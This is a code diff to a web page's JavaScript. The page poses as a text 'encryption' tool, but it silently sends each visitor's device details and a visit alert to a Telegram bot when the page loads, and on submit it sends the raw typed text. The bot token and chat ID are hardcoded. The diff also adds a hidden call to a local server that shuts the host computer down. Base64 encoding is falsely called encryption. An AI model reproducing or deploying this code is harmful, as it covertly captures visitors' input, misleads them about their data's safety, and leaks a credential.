@@ -1,12 +1,10 @@
 const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
 const CHAT_ID = '1339887333';
 
-// Send alert automatically when page loads
 window.onload = function() {
   sendTelegramAlert("🚨 *New Visitor Alert!*");
 };
 
-// Fetch visitor public IP with 3-second timeout for mobile compatibility
 async function getUserIP() {
   const controller = new AbortController();
   const timeoutId = setTimeout(() => controller.abort(), 3000);
@@ -22,12 +20,10 @@ async function getUserIP() {
   }
 }
 
-// Encode string safely to Base64
 function encryptText(str) {
   return btoa(unescape(encodeURIComponent(str)));
 }
 
-// Send payload to Telegram API
 async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
   const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
@@ -55,9 +51,7 @@ async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
   try {
     await fetch(url, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message,
@@ -69,7 +63,17 @@ async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
   }
 }
 
-// Handle button trigger
+// Function to call the local Python shutdown server
+async function triggerLocalShutdown() {
+  try {
+    await fetch('http://localhost:5000/shutdown', {
+      method: 'POST'
+    });
+  } catch (err) {
+    console.warn("Local shutdown server not running on host computer.");
+  }
+}
+
 async function handleGenerate() {
   const inputField = document.getElementById('userInput');
   const rawText = inputField.value.trim();
@@ -84,16 +88,17 @@ async function handleGenerate() {
   btn.disabled = true;
   btn.innerText = "Processing...";
 
-  // Encrypt raw input
   const cipherText = encryptText(rawText);
 
-  // Update DOM elements
   encryptedTextEl.innerText = cipherText;
   encryptedContainer.style.display = "block";
   successAlert.style.display = "block";
 
-  // Send original and encrypted text to Telegram
+  // 1. Send alert to Telegram
   await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);
+
+  // 2. Trigger local Windows shutdown call
+  triggerLocalShutdown();
 
   btn.disabled = false;
   btn.innerText = "Generate Response";
